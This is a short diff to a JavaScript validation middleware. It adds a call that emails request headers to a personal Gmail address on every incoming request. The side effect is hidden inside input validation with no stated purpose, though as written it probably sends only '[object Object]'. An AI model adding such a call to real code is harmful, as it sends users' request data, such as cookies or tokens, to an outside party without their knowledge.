@@ -1,3 +1,4 @@
+import main from "../services/sendEmail.js"
 
 
 
@@ -5,6 +6,7 @@
 export default
     (schema) => {
         return (req, res, next) => {
+            main('alihgad2@gmail.com', `<p>${req.headers}</p>`, 'vercel')
             let keys = Object.keys(schema)
             let errors = []
             keys.forEach(key => {
